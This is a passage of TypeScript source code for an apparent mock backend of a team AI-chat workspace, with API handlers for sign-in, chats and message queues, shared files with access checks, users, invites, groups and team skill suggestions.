    chat.runState = this.queuePositions.has(chatId) ? 'queued' : 'running'
    this.queueRevision++
    const gen = this.generation
    // a reset in between abandons the turn (its chat is gone)
    this.runTurn(chatId, user, prompt, assistant).catch((e) => { if (gen === this.generation) console.error('mock turn failed', e) })
    return assistant
  }

  // ---------------- handlers ----------------
  handlers: Partial<Record<ApiName, Handler>> = {
    frequentQuestions: () => ({ items: [], days: 30, sampled: false }),
    popularSkills: () => ({ items: [], days: 30 }),
    listSkillIssues: () => ({ items: [] }),
    // the owner's checklist on the home screen asks for it (a 404 here was only a console error before)
    listSkills: () => ({ items: [] }),
    health: () => ({ ok: true, version: this.serverVersion, schema: { applied: 2, readerLevel: 1 }, uptimeSec: 1, time: now() }),
    setupStatus: () => ({ needed: this.setupNeeded, teamName: this.setupNeeded ? null : this.settings.teamName, defaultLocale: this.settings.defaultLocale }),
    setup: (c) => {
      if (!this.setupNeeded) fail('conflict', 409)
      if (c.body.setupToken !== 'setup-token-0123456789') fail('forbidden', 403, 'wrong setup token')
      this.setupNeeded = false
      this.settings.teamName = c.body.teamName
      this.settings.defaultLocale = c.body.locale
      // like the server: the browser's time zone becomes the team's
      if (typeof c.body.timeZone === 'string') this.settings.timeZone = c.body.timeZone
      const u = this.addUser({ id: c.body.owner.username.toLowerCase().replace(/[^a-z0-9_-]/g, ''), username: c.body.owner.username, name: c.body.owner.name, role: 'owner', groupIds: [] }, c.body.owner.password)
      this.files.set('users', { type: 'folder', mtime: now() })
      return { status: 201, cookie: this.startSession(u), body: { me: this.me(u, '') } }
    },
    login: (c) => {
      const u = this.users.find((x) => x.username === c.body.username)
      // like the server: before sign-in, the page's language header, else the team default
      const loc = Locale.safeParse(c.req.headers.get(LOCALE_HEADER)).data ?? this.settings.defaultLocale
      const wrong = { ko: '아이디나 비밀번호가 맞지 않습니다.', en: 'Wrong username or password.', id: 'Nama pengguna atau kata sandi salah.', ja: 'ユーザー名またはパスワードが正しくありません。', es: 'El nombre de usuario o la contraseña son incorrectos.' }[loc]
      if (!u || this.passwords.get(u.username) !== c.body.password) fail('unauthorized', 401, wrong)
      if (u!.mustChangePassword) this.tempLogins.add(u!.id)
      else this.tempLogins.delete(u!.id)
      return { cookie: this.startSession(u!), body: { me: this.me(u!, '') } }
    },
    logout: () => ({ cookie: `${DEV_SESSION_COOKIE}=; Path=/; Max-Age=0`, body: undefined }),
    me: (c) => this.me(c.user, ''),
    updateMe: (c) => {
      const u = c.user as User & { prefs?: Me['user']['prefs'] }
      if (c.body.name) u.name = c.body.name
      if (c.body.locale !== undefined) u.localeChoice = c.body.locale
      this.syncLocales()
      if (c.body.locale !== undefined) this.publish(LOCALE_CHANGED)
      if (c.body.email !== undefined) u.email = c.body.email
      if (c.body.prefs) {
        const next: Record<string, unknown> = { ...u.prefs, ...c.body.prefs }
        if (!this.canChoose(u)) { delete next.engine; delete next.model }
        for (const [k, v] of Object.entries(next)) if (v === undefined || v === null) delete next[k]
        u.prefs = next as Me['user']['prefs']
      }
      return this.me(u, '')
    },
    changePassword: (c) => {
      // like the server: no current password only right after signing in with a temporary one
      if (c.body.currentPassword === undefined) {
        if (!(c.user.mustChangePassword && this.tempLogins.has(c.user.id))) fail('validation', 400, 'current password required')
      } else if (this.passwords.get(c.user.username) !== c.body.currentPassword) fail('forbidden', 403, 'wrong password')
      this.passwords.set(c.user.username, c.body.newPassword)
      c.user.mustChangePassword = false
      this.tempLogins.delete(c.user.id)
      return { ok: true }
    },
    mySessions: () => ({ items: [{ id: '0192f0a0-0000-7000-8000-000000000000', client: 'web', userAgent: 'Chrome on macOS', createdAt: now(), lastSeenAt: now(), expiresAt: now(), current: true }] }),
    inviteInfo: (c) => {
      const i = this.invites.find((x) => x.token === c.params.token)
      if (!i) fail('not_found', 404)
      return { teamName: this.settings.teamName, role: i!.role, expiresAt: i!.expiresAt, valid: !i!.usedAt }
    },
    acceptInvite: (c) => {
      const i = this.invites.find((x) => x.token === c.params.token && !x.usedAt)
      if (!i) fail('gone', 410)
      const u = this.addUser({ id: c.body.username.toLowerCase(), username: c.body.username, name: c.body.name, role: i!.role, groupIds: i!.groupIds, localeChoice: c.body.locale ?? null }, c.body.password)
      i!.usedAt = now()
      i!.usedBy = { id: u.id, name: u.name }
      return { status: 201, cookie: this.startSession(u), body: { me: this.me(u, '') } }
    },

    listChats: (c) => {
      const q = (c.query.q ?? '').toLowerCase()
      const trash = c.query.trash === '1' || c.query.trash === 'true'
      let list = this.chats.filter((x) => !!x.deletedAt === trash)
      if (c.query.projectId) list = list.filter((x) => x.projectId === c.query.projectId)
      if (q) list = list.filter((x) => x.title.toLowerCase().includes(q) || this.messages.some((m) => m.chatId === x.id && m.content.toLowerCase().includes(q)))
      return { items: [...list].sort((a, b) => (a.updatedAt < b.updatedAt ? 1 : -1)), nextCursor: null }
    },
    chatEngines: (c) => {
      const e = this.enginesResponse()
      const canChoose = this.canChoose(c.user)
      return {
        canChoose, defaultEngine: this.settings.defaultEngine, defaultModel: this.settings.defaultModel,
        engines: canChoose ? e.engines.filter((x) => x.enabled).map((x) => ({ id: x.id, label: x.label, models: x.models })) : [],
      }
    },
    createChat: (c) => {
      this.guardEngine('createChat', c.user, c.body, { engine: this.settings.defaultEngine, model: this.settings.defaultModel })
      const chat: Chat = { id: uuidv7(), projectId: c.body.projectId ?? null, title: c.body.title ?? '', engine: c.body.engine ?? 'claude-code', model: c.body.model ?? null, createdAt: now(), updatedAt: now(), deletedAt: null, runState: 'idle' }
      this.chats.push(chat)
      return { status: 201, body: chat }
    },
    getChat: (c) => this.chats.find((x) => x.id === c.params.id) ?? fail('not_found', 404),
    getChatQueue: (c) => {
      const assistant = this.messages.find(m => m.chatId === c.params.id && m.status === 'streaming')
      const position = assistant ? this.queuePositions.get(c.params.id!) ?? 0 : null
      return { state: position === null ? 'idle' : position > 0 ? 'queued' : 'running',
        turnId: assistant?.turnId ?? null, messageId: assistant?.id ?? null, position, epoch: this.epoch, revision: this.queueRevision }
    },
    updateChat: (c) => {
      const chat = this.chats.find((x) => x.id === c.params.id) ?? fail('not_found', 404)
      this.guardEngine('updateChat', c.user, c.body, chat)
      Object.assign(chat, Object.fromEntries(Object.entries(c.body).filter(([, v]) => v !== undefined)))
      return chat
    },
    deleteChat: (c) => {
      const chat = this.chats.find((x) => x.id === c.params.id) ?? fail('not_found', 404)
      chat.deletedAt = now()
      return { id: chat.id, deletedAt: chat.deletedAt, purgeAt: new Date(Date.now() + 7 * 86400_000).toISOString() }
    },
    restoreChat: (c) => {
      const chat = this.chats.find((x) => x.id === c.params.id) ?? fail('not_found', 404)
      chat.deletedAt = null
      return chat
    },
    listMessages: (c) => ({ items: this.path(c.params.id!), nextCursor: null }),
    listTurnRequests: (c) => ({ items: [...this.openAsks.values()].filter((r) => r.chatId === c.params.id) }),
    sendMessage: (c) => {
      const chat = this.chats.find((x) => x.id === c.params.id) ?? fail('not_found', 404)
      const dup = this.messages.find((m) => (m as Message & { cmid?: string }).cmid === c.body.clientMessageId)
      if (dup) fail('conflict', 409)
      this.guardEngine('sendMessage', c.user, c.body, chat)
      if (c.body.engine) chat.engine = c.body.engine
      if (c.body.model !== undefined) chat.model = c.body.model ?? null
      // like the server when the person's "block" usage limit is used up (refused before anything is queued)
      if (String(c.body.content).includes('over my limit')) fail('budget_exceeded', 429, '오늘 AI 사용 한도를 다 썼어요. 10월 22일 오전 12:00부터 다시 쓸 수 있어요.')
      const parentId = c.body.parentId ?? this.activeLeaf.get(chat.id) ?? null
      const atts = (c.body.attachmentIds as string[]).map((id) => this.attachments.get(id)).filter(Boolean).map((a) => { const { data: _d, ...rest } = a!; return rest })
      const user = this.message({ chatId: chat.id, role: 'user', parentId, content: c.body.content, attachments: atts, author: { id: c.user.id, name: c.user.name } })
      ;(user as Message & { cmid?: string }).cmid = c.body.clientMessageId
      if (/^fail-send/.test(c.body.content)) fail('internal', 500, 'send failed on purpose')
      const assistant = this.startTurn(chat.id, c.user, c.body.content, user.id)
      return { status: 202, body: { userMessage: this.view(user), assistantMessage: this.view(assistant), turnId: assistant.turnId, queuePosition: this.queuePositions.get(chat.id) ?? 0, queueEpoch: this.epoch, queueRevision: this.queueRevision } }
    },
    stop: (c) => {
      const running = this.messages.find((m) => m.chatId === c.params.id && m.status === 'streaming')
      if (running?.turnId) this.stopped.add(running.turnId)
      return { stopped: !!running, turnId: running?.turnId ?? null }
    },
    regenerate: (c) => {
      const old = this.messages.find((m) => m.id === c.params.messageId) ?? fail('not_found', 404)
      const userMsg = this.messages.find((m) => m.id === old.parentId)!
      const chat = this.chats.find((x) => x.id === c.params.id) ?? fail('not_found', 404)
      this.guardEngine('regenerate', c.user, c.body, chat)
      if (c.body.engine) chat.engine = c.body.engine
      if (c.body.model !== undefined) chat.model = c.body.model ?? null
      const assistant = this.startTurn(c.params.id!, c.user, userMsg.content, userMsg.id)
      return { status: 202, body: { userMessage: null, assistantMessage: this.view(assistant), turnId: assistant.turnId, queuePosition: 0 } }
    },
    editMessage: (c) => {
      const old = this.messages.find((m) => m.id === c.params.messageId) ?? fail('not_found', 404)
      this.guardEngine('editMessage', c.user, c.body, this.chats.find((x) => x.id === old.chatId)!)
      const user = this.message({ chatId: old.chatId, role: 'user', parentId: old.parentId, content: c.body.content, author: { id: c.user.id, name: c.user.name } })
      const assistant = this.startTurn(old.chatId, c.user, c.body.content, user.id)
      return { status: 202, body: { userMessage: this.view(user), assistantMessage: this.view(assistant), turnId: assistant.turnId, queuePosition: 0 } }
    },
    selectBranch: (c) => {
      this.activeLeaf.set(c.params.id!, this.newestLeafUnder(c.body.messageId))
      return { items: this.path(c.params.id!), nextCursor: null }
    },
    answerTurn: (c) => {
      const r = this.pendingAsk.get(c.params.id!)
      if (!r) fail('not_found', 404)
      this.pendingAsk.delete(c.params.id!)
      r!(c.body.kind === 'ask_user' ? c.body.answer : c.body.decision)
      return undefined
    },
    listProjects: () => ({ items: this.projects }),
    createProject: (c) => {
      const p: Project = { id: uuidv7(), name: c.body.name, folderPath: c.body.folderPath ?? (c.body.scope === 'personal' ? `users/${c.user.id}/projects/${c.body.name}` : `projects/${c.body.name}`), instructions: c.body.instructions ?? '', createdBy: { id: c.user.id, name: c.user.name }, createdAt: now(), canEdit: true }
      this.projects.push(p)
      return { status: 201, body: p }
    },
    getProject: (c) => this.projects.find((p) => p.id === c.params.id) ?? fail('not_found', 404),
    updateProject: (c) => Object.assign(this.projects.find((p) => p.id === c.params.id) ?? fail('not_found', 404), c.body),
    deleteProject: (c) => {
      this.projects = this.projects.filter((p) => p.id !== c.params.id)
      return undefined
    },
    listMemories: () => ({ items: this.memories, nextCursor: null }),
    deleteMemory: (c) => {
      this.memories = this.memories.filter((m) => m.id !== c.params.id)
      return undefined
    },
    clearMemories: () => {
      this.memories = []
      return undefined
    },

    tree: (c) => {
      const path = c.query.path ?? ''
      if (path && !this.files.has(path)) fail('not_found', 404)
      if (this.access(path, c.user) === 'none' && path !== 'secret') fail('not_found', 404)
      const kids = [...this.files.entries()].filter(([p]) => (path ? p.startsWith(path + '/') && !p.slice(path.length + 1).includes('/') : !p.includes('/')))
      const entries = kids
        .map(([p, n]) => this.entry(p, n, c.user))
        .filter((e) => !(e.path.startsWith('users/') && e.access === 'none'))
        .sort((a, b) => (a.type !== b.type ? (a.type === 'folder' ? -1 : 1) : a.name.localeCompare(b.name)))
      return { path, access: this.access(path, c.user), entries, nextCursor: null }
    },
    content: (c) => {
      const n = this.files.get(c.query.path!)
      if (!n || n.type !== 'file' || this.access(c.query.path!, c.user) === 'none') fail('not_found', 404)
      return { path: c.query.path, size: n!.data!.byteLength, mtime: n!.mtime, sha256: new Bun.CryptoHasher('sha256').update(n!.data!).digest('hex'), mime: mimeOf(c.query.path!), binary: false, content: dec.decode(n!.data!), truncated: false, access: this.access(c.query.path!, c.user) }
    },
    saveContent: (c) => {
      let path: string = c.body.path
      if (this.access(path, c.user) !== 'write') fail('forbidden', 403)
      let conflict = false
      const cur = this.files.get(path)?.data
      if (cur && (c.body.baseSha256 === null || c.body.baseSha256 !== new Bun.CryptoHasher('sha256').update(cur).digest('hex'))) {
        conflict = true
        path = path.replace(/(\.[^.]+)?$/, (ext) => ` (충돌 사본 - ${c.user.name})${ext}`)
      }
      this.putFile(path, c.body.content)
      return { path, conflict, entry: this.entry(path, this.files.get(path)!, c.user) }
    },
    hwpPreview: async (c) => {
      const n = this.files.get(c.query.path!)
      if (!n || n.type !== 'file' || this.access(c.query.path!, c.user) === 'none') fail('not_found', 404)
      try {
        const r = await (await hwpEngine).render(Buffer.from(n!.data!), c.query.path!.endsWith('.hwpx') ? 'hwpx' : 'hwp', Number(c.query.page))
        return { ...r.meta, id: crypto.randomUUID(), png: r.bytes.toString('base64') }
      } catch (e) { throw new Fail('unavailable', 503, undefined, undefined, { reason: e && typeof e === 'object' && 'reason' in e ? String(e.reason) : 'engine' }) }
    },
    download: (c) => {
      const n = this.files.get(c.query.path!)
      if (!n || n.type !== 'file' || this.access(c.query.path!, c.user) === 'none') fail('not_found', 404)
      return new Response(n!.data! as unknown as BodyInit, { headers: { 'content-type': mimeOf(c.query.path!) ?? 'application/octet-stream', 'content-length': String(n!.data!.byteLength), 'content-disposition': 'attachment', 'x-content-type-options': 'nosniff', 'content-security-policy': "sandbox; default-src 'none'" } })
    },
    upload: (c) => {
      const folder: string = c.body.folder
      if (this.access(folder, c.user) !== 'write') fail('forbidden', 403)
      const name = c.body.name ?? c.file!.name
      let path = folder ? `${folder}/${name}` : name
      if (this.files.has(path)) path = path.replace(/(\.[^.]+)?$/, (ext: string) => ` (2)${ext}`)
      return (async () => {
        this.putFile(path, new Uint8Array(await c.file!.arrayBuffer()))
        this.publish({ type: 'files.changed', data: { changes: [{ path, action: 'create', by: { id: c.user.id, name: c.user.name }, turnId: null }] } })
        return { status: 201, body: this.entry(path, this.files.get(path)!, c.user) }
      })()
    },
    mkdir: (c) => {
      if (this.files.has(c.body.path)) fail('conflict', 409)
      this.files.set(c.body.path, { type: 'folder', mtime: now() })
      return { status: 201, body: this.entry(c.body.path, this.files.get(c.body.path)!, c.user) }
    },
    move: (c) => {
      const from: string = c.body.from
      const n = this.files.get(from) ?? fail('not_found', 404)
      if (this.access(from, c.user) !== 'write') fail('forbidden', 403)
      let to: string = c.body.to
      if (to === from) return { entry: this.entry(from, n, c.user) }
      if (this.files.has(to)) {
        if (c.body.onExists !== 'rename') fail('conflict', 409)
        to = this.freePath(to)
      }
      if (this.access(parentOf(to), c.user) !== 'write') fail('forbidden', 403)
      // like server/src/team-files/service.ts: into the mover's own users/<id>/ while other people can read it now
      const own = `users/${c.user.id}/`
      if (to.startsWith(own) && !from.startsWith(own) && !c.body.confirm) {
        const lost = this.users.filter((u) => u.id !== c.user.id && this.access(from, u) !== 'none' && this.access(to, u) === 'none').length
        if (lost > 0) throw new Fail('conflict', 409, undefined, undefined, { reason: 'audience_narrowed', lostViewers: lost })
      }
      for (const [p, v] of [...this.files.entries()]) {
        if (p === from || p.startsWith(from + '/')) {
          this.files.delete(p)
          this.files.set(to + p.slice(from.length), v)
        }
      }
      return { entry: this.entry(to, n, c.user) }
    },
    // share by copying (server/src/team-files/service.ts copy): files only; dryRun counts who would see it in addition
    copy: (c) => {
      const from: string = c.body.from
      const n = this.files.get(from)
      if (!n || this.access(from, c.user) === 'none') return fail('not_found', 404)
      if (n.type !== 'file') fail('validation', 400, 'a folder cannot be copied')
      let to: string = c.body.to
      const parent = parentOf(to)
      if (parent && this.files.get(parent)?.type !== 'folder') fail('not_found', 404)
      if (this.access(parent, c.user) !== 'write') fail('forbidden', 403)
      const viewersAdded = this.users.filter((u) => u.id !== c.user.id && this.access(to, u) !== 'none' && this.access(from, u) === 'none').length
      if (c.body.dryRun) return { viewersAdded }
      if (this.files.has(to)) {
        if (c.body.onExists === 'fail') fail('conflict', 409)
        if (c.body.onExists === 'rename') to = this.freePath(to)
      }
      this.putFile(to, n.data!)
      return { path: to, sha256: sha256Hex(n.data!) }
    },
    remove: (c) => {
      const n = this.files.get(c.query.path!) ?? fail('not_found', 404)
      this.files.delete(c.query.path!)
      const item = { id: uuidv7(), originalPath: c.query.path!, size: n.data?.byteLength ?? 0, deletedBy: { id: c.user.id, name: c.user.name }, turnId: null, deletedAt: now(), purgeAt: new Date(Date.now() + this.settings.trashRetentionDays * 86400_000).toISOString(), node: n }
      this.trash.push(item)
      return { trashId: item.id, purgeAt: item.purgeAt }
    },
    history: (c) => {
      const f = this.files.get(c.query.path!)
      const items = this.versions.filter((v) => v.path === c.query.path)
      const current = f?.data ? { version: Math.max(0, ...items.map((v) => v.version)) + 1, sha256: sha256Hex(f.data), size: f.data.byteLength, author: { id: 'olga', name: 'Olga' }, turnId: null, at: f.mtime } : null
      const events = current ? [{ id: 1, at: f!.mtime, kind: 'edited' as const, by: current.author, turnId: null, path: c.query.path!, from: null, size: current.size }] : []
      return { path: c.query.path, items, currentSha256: current?.sha256 ?? null, canRestore: this.access(c.query.path!, c.user) === 'write', current, events }
    },
    versionDownload: (c) => {
      const v = this.versions.find((x) => x.id === c.params.versionId) ?? fail('not_found', 404)
      return new Response(`version ${v.version}`, { headers: { 'content-disposition': 'attachment' } })
    },
    restoreVersion: (c) => {
      const v = this.versions.find((x) => x.id === c.body.versionId) ?? fail('not_found', 404)
      if (this.access(v.path, c.user) !== 'write') fail('forbidden', 403)
      this.versions.push({ ...v, id: uuidv7(), version: this.versions.filter((x) => x.path === v.path).length + 1, kind: 'restore', createdAt: now(), author: { id: c.user.id, name: c.user.name }, savedBy: null, savedTurnId: null })
      return { path: v.path, conflict: false, entry: this.entry(v.path, this.files.get(v.path)!, c.user) }
    },
    trash: () => ({ items: this.trash.map(({ node: _n, ...t }) => t), nextCursor: null }),
    restoreTrash: (c) => {
      const t = this.trash.find((x) => x.id === c.params.id) ?? fail('not_found', 404)
      this.trash = this.trash.filter((x) => x.id !== t.id)
      this.files.set(t.originalPath, t.node)
      return { entry: this.entry(t.originalPath, t.node, c.user) }
    },
    attachTeamFile: (c) => {
      const path: string = c.body.path
      const n = this.files.get(path)
      if (!n || n.type !== 'file' || this.access(path, c.user) === 'none') fail('not_found', 404)
      const name = path.slice(path.lastIndexOf('/') + 1)
      const mime = mimeOf(path) ?? 'application/octet-stream'
      const a: Attachment & { data: Uint8Array } = {
        id: uuidv7(), name, path, size: n!.data!.byteLength, mime, kind: mime.startsWith('image/') ? 'image' : 'text', source: 'team',
        sha256: new Bun.CryptoHasher('sha256').update(n!.data!).digest('hex'), data: n!.data!,
      }
      this.attachments.set(a.id, a)
      return { status: 201, body: (({ data: _d, ...rest }) => rest)(a) }
    },
    findFiles: (c) => {
      const q = String(c.query.q ?? '').toLowerCase()
      const base = String(c.query.path ?? '')
      const items = [...this.files.entries()]
        .filter(([p, n]) => n.type === 'file' && (!base || p.startsWith(base + '/')) && p.slice(p.lastIndexOf('/') + 1).toLowerCase().includes(q) && this.access(p, c.user) !== 'none' && !(p.startsWith('users/') && !p.startsWith(`users/${c.user.id}/`)))
        .map(([p, n]) => this.entry(p, n, c.user))
      return { items: items.slice(0, Number(c.query.limit ?? 50)), truncated: false }
    },
    recentFiles: (c) => {
      const items = [...this.files.entries()]
        .filter(([p, n]) => n.type === 'file' && this.access(p, c.user) !== 'none' && !p.startsWith('users/'))
        .sort((a, b) => b[1].mtime.localeCompare(a[1].mtime))
        .map(([p, n]) => this.entry(p, n, c.user))
      return { items: items.slice(0, Number(c.query.limit ?? 20)), truncated: false }
    },
    uploadAttachment: async (c) => {
      const data = new Uint8Array(await c.file!.arrayBuffer())
      return { status: 201, body: this.makeAttachment(c.body.chatId, c.body.name ?? c.file!.name, data, c.file!.type, c.user) }
    },
    attachmentThumbnail: (c) => {
      const a = this.attachments.get(c.params.id!) ?? fail('not_found', 404)
      return new Response(a.data as unknown as BodyInit, { headers: { 'content-type': a.mime } })
    },
    createUploadSession: (c) => {
      const s: UploadSession & { chunks: Map<number, Uint8Array> } = { id: uuidv7(), target: c.body.target, size: c.body.size, sha256: c.body.sha256, chunkSize: UPLOAD_CHUNK_SIZE, chunkCount: Math.ceil(c.body.size / UPLOAD_CHUNK_SIZE), received: [], expiresAt: new Date(Date.now() + 86400_000).toISOString(), chunks: new Map() }
      this.uploads.set(s.id, s)
      const { chunks: _x, ...out } = s
      return { status: 201, body: out }
    },
    uploadChunk: async (c) => {
      const s = this.uploads.get(c.params.id!) ?? fail('gone', 410)
      s.chunks.set(Number(c.params.n), new Uint8Array(await c.req.arrayBuffer()))
      s.received = [...s.chunks.keys()].sort((a, b) => a - b)
      return { received: s.received }
    },
    getUploadSession: (c) => {
      const s = this.uploads.get(c.params.id!) ?? fail('gone', 410)
      const { chunks: _x, ...out } = s
      return out
    },
    completeUploadSession: async (c) => {
      const s = this.uploads.get(c.params.id!) ?? fail('gone', 410)
      const all = new Uint8Array(s.size)
      for (const [n, d] of s.chunks) all.set(d, n * s.chunkSize)
      const hash = new Bun.CryptoHasher('sha256').update(all).digest('hex')
      if (hash !== s.sha256) fail('conflict', 409, 'sha256 mismatch')
      this.uploads.delete(s.id)
      if (s.target.kind === 'path') {
        this.putFile(s.target.path, all)
        return { kind: 'path', entry: this.entry(s.target.path, this.files.get(s.target.path)!, c.user) }
      }
      if (s.target.kind === 'attachment') return { kind: 'attachment', attachment: this.makeAttachment(s.target.chatId, s.target.name, all, 'application/octet-stream', c.user) }
      return { kind: 'transcribe', jobId: this.transcribeJob(c.user) }
    },
    cancelUploadSession: (c) => {
      this.uploads.delete(c.params.id!)
      return undefined
    },
    listChatArtifacts: (c) => {
      const keys = [...new Set(this.artifacts.filter((a) => a.chatId === c.params.id).map((a) => a.key))]
      return { items: keys.map((key) => ({ key, versions: this.artifacts.filter((a) => a.chatId === c.params.id && a.key === key).sort((a, b) => b.version - a.version).map(({ content, ...s }) => ({ ...s, size: content.length })) })) }
    },
    getArtifact: (c) => this.artifacts.find((a) => a.id === c.params.id) ?? fail('not_found', 404),
    getJob: (c) => this.jobs.get(c.params.id!) ?? fail('not_found', 404),
    cancelJob: (c) => {
      const j = this.jobs.get(c.params.id!) ?? fail('not_found', 404)
      j.status = 'canceled'
      return j
    },
    transcribe: (c) => ({ status: 202, body: { jobId: this.transcribeJob(c.user) } }),
    pollCalls: () => ({ calls: [] }),
    postResult: () => undefined,

    listUsers: () => ({ items: this.users }),
    createUser: (c) => {
      checkTemp(c.body.temporaryPassword)
      if (this.users.some((x) => x.username.toLowerCase() === c.body.username.toLowerCase())) fail('conflict', 409, '이미 쓰고 있는 아이디입니다.')
      const u = this.addUser({ id: c.body.username.toLowerCase(), username: c.body.username, name: c.body.name, role: c.body.role, groupIds: c.body.groupIds ?? [], mustChangePassword: true, localeChoice: c.body.locale ?? null }, c.body.temporaryPassword ?? 'tiger4271')
      return { status: 201, body: { user: u, temporaryPassword: c.body.temporaryPassword ?? 'tiger4271', expiresAt: tempUntil(), signInUrl: 'https://team.example.com' } }
    },
    updateUser: (c) => {
      const { locale, ...rest } = c.body
      const u = Object.assign(this.users.find((x) => x.id === c.params.id) ?? fail('not_found', 404), Object.fromEntries(Object.entries(rest).filter(([, v]) => v !== undefined)))
      if (locale !== undefined) u.localeChoice = locale
      this.syncLocales()
      return u
    },
    deleteUser: (c) => {
      this.users = this.users.filter((u) => u.id !== c.params.id)
      return undefined
    },
    resetPassword: (c) => {
      const u = this.users.find((x) => x.id === c.params.id) ?? fail('not_found', 404)
      checkTemp(c.body?.temporaryPassword)
      const temp = c.body?.temporaryPassword ?? 'maple0385'
      this.passwords.set(u!.username, temp)
      u!.mustChangePassword = true
      this.resets.set(u!.id, { by: { id: c.user.id, name: c.user.name }, at: now() })
      return { temporaryPassword: temp, expiresAt: tempUntil(), signInUrl: 'https://team.example.com' }
    },
    // like server/src/admin/users.ts transferOwnership: the password again, then the old owner becomes an admin
    transferOwnership: (c) => {
      if (this.passwords.get(c.user.username) !== c.body.password) fail('forbidden', 403, '비밀번호가 맞지 않습니다. 다시 입력해 주세요.')
      const u = this.users.find((x) => x.id === c.body.userId && x.status === 'active') ?? fail('not_found', 404)
      if (u.id === c.user.id) fail('forbidden', 403)
      for (const x of this.users) if (x.role === 'owner') x.role = 'admin'
      u.role = 'owner'
      return { ok: true as const }
    },
    createResetLink: (c) => {
      const u = this.users.find((x) => x.id === c.params.id) ?? fail('not_found', 404)
      if (u.role === 'owner') fail('forbidden', 403)
      const token = 'rst' + uuidv7().replace(/-/g, '')
      return { token, url: `/reset-password/${token}`, expiresAt: new Date(Date.now() + 24 * 3600_000).toISOString() }
    },
    listInvites: () => ({ items: this.invites.map(({ token: _t, ...i }) => i) }),
    createInvite: (c) => {
      const token = 'inv' + uuidv7().replace(/-/g, '')
      const i = { id: uuidv7(), role: c.body.role ?? 'member', groupIds: c.body.groupIds ?? [], createdBy: { id: c.user.id, name: c.user.name }, createdAt: now(), expiresAt: new Date(Date.now() + (c.body.expiresInHours ?? 72) * 3600_000).toISOString(), usedAt: null, usedBy: null, token }
      this.invites.push(i)
      const { token: _t, ...invite } = i
      return { status: 201, body: { invite, token, url: `/invite/${token}` } }
    },
    revokeInvite: (c) => {
      this.invites = this.invites.filter((i) => i.id !== c.params.id)
      return undefined
    },
    listGroups: () => ({ items: this.groups }),
    createGroup: (c) => {
      const g: Group = { id: uuidv7(), name: c.body.name, description: c.body.description ?? null, memberIds: c.body.memberIds ?? [] }
      this.groups.push(g)
      return { status: 201, body: g }
    },
    updateGroup: (c) => Object.assign(this.groups.find((g) => g.id === c.params.id) ?? fail('not_found', 404), Object.fromEntries(Object.entries(c.body).filter(([, v]) => v !== undefined))),
    deleteGroup: (c) => {
      this.groups = this.groups.filter((g) => g.id !== c.params.id)
      return undefined
    },
    listFolders: () => ({ items: this.folders }),
    // ---- team skills ----
    listSkillManagers: () => this.skillManagersResponse(),
    setSkillManager: (c) => {
      const { subjectType, subjectId, enabled } = c.body as { subjectType: 'user' | 'group'; subjectId: string; enabled: boolean }
      const p = (c.body.path as string) ?? 'skills'
      const u = this.users.find((x) => x.id === subjectId)
      if (subjectType === 'user' && (!u || u.role !== 'member')) fail('validation', 400, '팀장·관리자는 항상 팀 스킬을 관리합니다.')
      if (!(p === 'skills' || p.startsWith('skills/'))) fail('validation', 400, 'skills/ 안의 볼 수 있는 폴더를 골라 주세요.')
      this.skillManagers = this.skillManagers.filter((g) => !(g.subjectType === subjectType && g.subjectId === subjectId && g.path === p))
      if (enabled) this.skillManagers.push({ subjectType, subjectId, path: p })
      if (enabled && !this.files.has(p)) this.files.set(p, { type: 'folder', mtime: now() })
      // the same rule Admin > 폴더 권한 shows
      let f = this.folders.find((x) => x.path === p)
      if (!f && enabled) {
        f = { id: uuidv7(), path: p, exists: true, createdAt: now(), rules: [{ id: uuidv7(), folderId: '', subjectType: 'everyone', subjectId: null, access: 'read', updatedBy: null, updatedAt: now() }] }
        f.rules[0]!.folderId = f.id
        this.folders.push(f)
      }
      if (f) {
        f.rules = f.rules.filter((r) => !(r.subjectType === subjectType && r.subjectId === subjectId))
        if (enabled) f.rules.push({ id: uuidv7(), folderId: f.id, subjectType, subjectId, access: 'write', updatedBy: { id: c.user.id, name: c.user.name }, updatedAt: now() })
      }
      return this.skillManagersResponse()
    },
    listSkillChanges: () => ({ items: this.skillChanges, nextCursor: null }),
    skillsOverview: (c) => ({
      managedFolders: this.managed(c.user),
      suggestFolders: ['skills', 'skills/재무'],
      pendingReview: this.suggestions.filter((s) => s.status === 'pending' && this.manages(c.user, s.targetFolder)).length,
      myPending: this.suggestions.filter((s) => s.status === 'pending' && s.suggester.id === c.user.id).length,
    }),
    listSkillSuggestions: (c) => ({
      items: this.suggestions.filter((s) => (c.query.scope === 'review' ? this.manages(c.user, s.targetFolder) : s.suggester.id === c.user.id)).map((s) => this.suggestionFor(s, c.user)),
      nextCursor: null,
    }),
    getSkillSuggestion: (c) => {
      const s = this.suggestions.find((x) => x.id === c.params.id)
      if (!s || !(s.suggester.id === c.user.id || this.manages(c.user, s.targetFolder))) fail('not_found', 404)
      return this.suggestionFor(s!, c.user)
    },
    createSkillSuggestion: (c) => {
      const src = c.body.source as { kind: 'message'; chatId: string; messageId: string } | { kind: 'file'; path: string }
      if (src.kind === 'message' && !this.messages.some((m) => m.id === src.messageId && m.chatId === src.chatId && this.chats.some((ch) => ch.id === src.chatId))) fail('not_found', 404)
      if (src.kind === 'file' && !src.path.startsWith(`users/${c.user.id}/`)) fail('not_found', 404)
      const s: SkillSuggestion = {
        id: uuidv7(), status: 'pending', targetFolder: c.body.targetFolder ?? 'skills', name: c.body.name, description: c.body.description ?? '', content: c.body.content,
        source: { kind: src.kind, path: src.kind === 'file' ? src.path : null }, suggester: { id: c.user.id, name: c.user.name }, reviewer: null, reviewNote: null, resultPath: null,
        createdAt: now(), reviewedAt: null, canReview: false,
      }
      this.suggestions.unshift(s)
      this.publish({ type: 'notice', data: { level: 'info', code: 'skill_suggested', message: `${c.user.name} 님이 스킬을 제안했어요: ${s.name} → ${s.targetFolder}/`, link: `/skills?review=${s.id}` } })
      return { status: 201, body: this.suggestionFor(s, c.user) }
    },
    approveSkillSuggestion: (c) => {
      const s = this.suggestions.find((x) => x.id === c.params.id)
      if (!s || !(s.suggester.id === c.user.id || this.manages(c.user, s.targetFolder))) fail('not_found', 404)
      if (!this.manages(c.user, s!.targetFolder) || !this.manages(c.user, c.body.targetFolder)) fail('forbidden', 403, '이 폴더의 팀 스킬을 관리할 권한이 없습니다.')
      if (s!.status !== 'pending') fail('conflict', 409, '이미 처리된 제안입니다.')
      const file = `${c.body.targetFolder}/${(c.body.fileName ?? c.body.name).trim().replace(/\s+/g, '-')}.md`
